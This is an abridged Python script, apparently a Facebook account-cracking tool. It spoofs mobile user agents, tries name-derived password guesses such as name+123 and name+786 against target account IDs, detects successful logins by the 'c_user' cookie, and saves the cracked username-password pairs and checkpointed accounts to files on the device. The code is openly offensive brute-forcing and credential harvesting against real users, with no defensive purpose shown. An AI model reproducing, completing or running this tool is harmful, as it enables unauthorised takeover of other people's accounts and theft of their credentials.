...
ua_NokiaE52  = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba;]'

ua_Huawei   = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a;]'
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;32m[ JAI ❤️] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;32m[JAI-SUCCESSFUL] %s | %s      ' % (user,pw))

				wrt = '%s - %s' % (user,pw)

				ok.append(wrt)

				open('/sdcard/JAI_OK.txt','a').write('%s\n' % wrt)
				...
				try:
					...
					open('/sdcard/JAI_CP.txt','a').write('%s\n' % wrt)
				...
				print('\r\033[1;91m[JAI-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
				...
				for yntkts in self.id:
					...
					try:
						...
						if len(xz) == 1:
							...
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"786",xz[0]+"786786"]
...
\033[1;94m ⇨AUTHOR    : AIMAL KHAN

\033[1;95m ⇨WHATSAPP  : 034753***5

\033[1;96m ⇨FACEBOOK  : AIMAL KHAN

\033[1;91m ⇨VERSION   : NA FEJNM
